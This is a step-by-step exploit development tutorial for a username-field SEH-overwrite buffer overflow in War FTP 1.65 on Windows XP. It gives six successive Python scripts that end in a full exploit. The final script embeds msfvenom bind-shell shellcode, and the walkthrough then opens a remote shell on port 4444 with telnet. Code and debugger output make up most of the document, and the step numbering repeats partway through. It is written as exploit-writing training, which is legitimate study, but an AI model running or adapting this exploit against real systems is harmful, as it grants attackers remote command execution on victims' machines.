Exploit for:
War FTP 1.65

Vulnerability:
War FTP fails to properly check boundaries on user-supplied data before copying it to an insufficiently sized buffer.

Description: 
We exploit War FTP's failure to properly check boundaries in its Username field of its FTP login and trigger a buffer overflow through an SEH overwrite.

Written by:
Jean Gonzalez
https://github.com/Jean13

Tested in: Windows XP SP2 and Windows XP SP3.

08/05/2016

Exploit Steps:

1) Download and install War FTP 1.65 on a machine running Windows XP.

2) Download and install Immunity Debugger on the same machine.

3) Start War FTP and click on the lightning bolt.

4) Start Immunity Debugger, attach War FTP and run it.

5) In Immunity Debugger click on View -> SEH chain.

6) On your Linux machine:
cat > WarFTP_Exploit_step1.py
#!/usr/bin/python
import socket

buffer = "A" * 1150

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.1.22',21))
response = s.recv(1024)

print(response)

s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)

print(response)

s.close()

7) On your Linux machine:
python WarFTP_Exploit_step1.py 

8) You should notice the program crashes. In the Registers section of the CPU pane in Immunity Debugger, you should notice that EIP points to 0x77C42332, a valid instruction in MSVCRT.dll. The program crashed writing to memory address 0x00B00000.
Notice that the instruction at 0x77C42332 is MOV BYTE PTR DS:[EDX],AL. The program is trying to write to the memory locaiton of the value of EDX. 
Taking a look at the SEH chain, you can see that it has been overwritten with A's. This means that although we cannot control EIP directly, we can control SEH.

9)In Immunity Debugger: !mona pattern_create 1150 

10) Copy the ASCII pattern from C:\logs\war-ftpd\pattern.txt into the exploit in place of the 1,150 A's.
In your Linux machine:
cp WarFTP_Exploit_step1.py WarFTP_Exploit_step2.py

vi WarFTP_Exploit_step2.py
#!/usr/bin/python
import socket

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2B"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.1.22',21))
response = s.recv(1024)

print(response)

s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)

print(response)

s.close()

11) In Immunity Debugger click on Debug -> Restart -> Yes -> Run.
If you get an error, close Immunity Debugger, delete the files created when you first ran War FTP and then repeat steps #3 through #5.

12) On your Linux machine:
python WarFTP_Exploit_step2.py 

13) You should notice the program crashes and that SEH is overwritten with 41317441.

14) In Immunity Debugger: !mona findmsp

15) Look at the log output in C:\logs\war-ftpd\findmsp.txt
Notice that NSEH is overwritten at 569 bytes (offset 569). 
SEH chain entries are made up of eight bytes, the NSEH entry followed by the SEH pointer. Hence, our SEH overwrite is at 573 bytes (four bytes after NSEH).

16) Click on the ESP register in Immunity Debugger, right-click -> Follow in Stack.

17) Looking at the CPU pane, you will notice that two steps down from ESP, at ESP+8, the memory address 00AFD94 points to our pattern. This means that if we can load ESP+8 into EIP, we can execute shellcode.
Important to note is that it seems that we have only four bytes to work with before hitting the SEH entry itself. 

18) Let us verify that our offsets are correct.
In your Linux machine:
cp WarFTP_Exploit_step2.py WarFTP_Exploit_step3.py

vi WarFTP_Exploit_step3.py
#!/usr/bin/python
import socket

buffer = "A" * 569 + "B" * 4 + "C" * 4 + "D" * 573

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.1.22',21))
response = s.recv(1024)

print(response)

s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)

print(response)

s.close()

19) In Immunity Debugger click on Debug -> Restart -> Yes -> Run.
If you get an error, close Immunity Debugger, delete the files created when you first ran War FTP and then repeat steps #3 through #5.

12) On your Linux machine:
python WarFTP_Exploit_step3.py 

13) You should notice that the program crashes and that SEH is overwritten by our four C's. Excellent. Our offsets are correct. 

14) Type Shift+F9 to pass the exception handler to the crashed program. The program should crash a second time when accessing the memory address 43434343, our C's. 

15) Click on the ESP register in Immunity Debugger, right-click -> Follow in Stack.

16)In Immunity Debugger: !mona seh
This gives us the modules that are not compiled with SafeSEH, in order to find the POP POP RET instructions we need.

17) Look at C:\logs\war-ftpd\seh.txt. 
Notice that only the War-FTP executable and a War-FTP DLL called MFC42.dll do not have SafeSEH. 

18) In Immunity Debugger: !mona seh -cpb "\x00\x40\x0a\x0d"
This makes Monda exclude entries with bad characters.
The first address, 5F4580CA, has the instructions we need: POP EBX, POP EBP, RET.
The important thing is that it includes the POP POP RET we need. 

19) In Immunity Debugger: bp 0x5F4580CA

20) In your Linux machine: 
cp WarFTP_Exploit_step3.py WarFTP_Exploit_step4.py

vi WarFTP_Exploit_step4.py
#!/usr/bin/python
import socket

# POP POP RET address in little-endian format.
buffer = "A" * 569 + "B" * 4 + "\xCA\x80\x45\x5F" + "D" * 573

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.1.22',21))
response = s.recv(1024)

print(response)

s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)

print(response)

s.close()

21) On your Linux machine:
python WarFTP_Exploit_step4.py

22) You should notice that the program crashes and that SEH is overwritten with 5F4580CA.

23) In Immunity Debugger: Shift-F9
Notice that we hit out breakpoint.
In the CPU pane you can see that the next instructions to be executed are our
POP POP RET. 

24) In Immunity Debugger: Shift-F7
Notice that as you press Shift-F7, ESP moves down to a higher address, and when we execute RET we end up in our attack string, at the pointer to the NSEH record filled with four B's. 
Excellent. We have redirected the program's execution to our attack string.
Note, however, that we have to do something about only having four bytes to work with.

25) In your Linux machine:
cp WarFTP_Exploit_step4.py WarFTP_Exploit_step5.py

vi WarFTP_Exploit_step5.py
#!/usr/bin/python
import socket
 
# Short jump assembly instruction to move EIP a short distance.
# POP POP RET address in little-endian format.
buffer = "A" * 569 + "\xEB\x06"  + "B" * 2 + "\xCA\x80\x45\x5F" + "D" * 573

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.1.22',21))
response = s.recv(1024)

print(response)

s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)

print(response)

s.close()

26) In Immunity Debugger click on Debug -> Restart -> Yes -> Run.
If you get an error, close Immunity Debugger, delete the files created when you first ran War FTP and then repeat steps #3 through #5.

27) In Immunity Debugger: bp 0x5F4580CA

27) On your Linux machine:
python WarFTP_Exploit_step5.py

28) In Immunity Debugger: Shift-F9 -> Shift-F7
Notice that as you press Shift-F7, after the POP POP RET we have a six-byte short jump. Notice that executing the short jump bypasses the SEH overwrite address and redirects execution to the rest of our attack string. 
Excellent. We got this. Now to choose a payload...

29) In your Linux machine:
msfvenom -p windows/shell_bind_tcp -s 573 -b '\x00\x40\x0a\x0d' -f ruby
Note that even though we are using Python, I chose the output to be Ruby. This is simply because the Ruby output comes out cleaner. It works with Python too.

30) In your Linux machine:
cp WarFTP_Exploit_step5.py WarFTP_Exploit_step6.py

vi WarFTP_Exploit_step6.py
#!/usr/bin/python

#
# Exploit for War FTP 1.65 vulnerability
# Written by Jean Gonzalez
# https://github.com/Jean13
#
# Cheers to Georgia Weidman
#
# Tested on Windows XP SP3 (En)
#
#
# 08/05/2016

import socket

# Encoder: x86/shikata_ga_nai
# Payload size: 355 bytes
# Payload: windows/shell_bind_tcp
shellcode = ("\xbb\xc4\xd7\xb1\xbb\xdd\xc4\xd9\x74\x24\xf4\x5a\x2b\xc9" +
"\xb1\x53\x31\x5a\x12\x83\xc2\x04\x03\x9e\xd9\x53\x4e\xe2" +
"\x0e\x11\xb1\x1a\xcf\x76\x3b\xff\xfe\xb6\x5f\x74\x50\x07" +
"\x2b\xd8\x5d\xec\x79\xc8\xd6\x80\x55\xff\x5f\x2e\x80\xce" +
"\x60\x03\xf0\x51\xe3\x5e\x25\xb1\xda\x90\x38\xb0\x1b\xcc" +
"\xb1\xe0\xf4\x9a\x64\x14\x70\xd6\xb4\x9f\xca\xf6\xbc\x7c" +
"\x9a\xf9\xed\xd3\x90\xa3\x2d\xd2\x75\xd8\x67\xcc\x9a\xe5" +
"\x3e\x67\x68\x91\xc0\xa1\xa0\x5a\x6e\x8c\x0c\xa9\x6e\xc9" +
"\xab\x52\x05\x23\xc8\xef\x1e\xf0\xb2\x2b\xaa\xe2\x15\xbf" +
"\x0c\xce\xa4\x6c\xca\x85\xab\xd9\x98\xc1\xaf\xdc\x4d\x7a" +
"\xcb\x55\x70\xac\x5d\x2d\x57\x68\x05\xf5\xf6\x29\xe3\x58" +
"\x06\x29\x4c\x04\xa2\x22\x61\x51\xdf\x69\xee\x96\xd2\x91" +
"\xee\xb0\x65\xe2\xdc\x1f\xde\x6c\x6d\xd7\xf8\x6b\x92\xc2" +
"\xbd\xe3\x6d\xed\xbd\x2a\xaa\xb9\xed\x44\x1b\xc2\x65\x94" +
"\xa4\x17\x13\x9c\x03\xc8\x06\x61\xf3\xb8\x86\xc9\x9c\xd2" +
"\x08\x36\xbc\xdc\xc2\x5f\x55\x21\xed\x4e\xfa\xac\x0b\x1a" +
"\x12\xf9\x84\xb2\xd0\xde\x1c\x25\x2a\x35\x35\xc1\x63\x5f" +
"\x82\xee\x73\x75\xa4\x78\xf8\x9a\x70\x99\xff\xb6\xd0\xce" +
"\x68\x4c\xb1\xbd\x09\x51\x98\x55\xa9\xc0\x47\xa5\xa4\xf8" +
"\xdf\xf2\xe1\xcf\x29\x96\x1f\x69\x80\x84\xdd\xef\xeb\x0c" +
"\x3a\xcc\xf2\x8d\xcf\x68\xd1\x9d\x09\x70\x5d\xc9\xc5\x27" +
"\x0b\xa7\xa3\x91\xfd\x11\x7a\x4d\x54\xf5\xfb\xbd\x67\x83" +
"\x03\xe8\x11\x6b\xb5\x45\x64\x94\x7a\x02\x60\xed\x66\xb2" +
"\x8f\x24\x23\xc2\xc5\x64\x02\x4b\x80\xfd\x16\x16\x33\x28" +
"\x54\x2f\xb0\xd8\x25\xd4\xa8\xa9\x20\x90\x6e\x42\x59\x89" +
"\x1a\x64\xce\xaa\x0e")
 
# Short jump assembly instruction to move EIP a short distance.
# POP POP RET address in little-endian format.
# Executing shellcode.
buffer = "A" * 569 + "\xEB\x06"  + "B" * 2 + "\xCA\x80\x45\x5F" + shellcode + "B" * 205

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.1.22',21))
response = s.recv(1024)

print(response)

s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)

print(response)

s.close()

31) Close Immunity Debugger and run War-FTP by itself.

32) In your Linux machine:
python WarFTP_Exploit_step6.py 

33) In your Linux machine:
telnet 192.168.1.22 4444

Congratulations! You just built another working exploit.

  

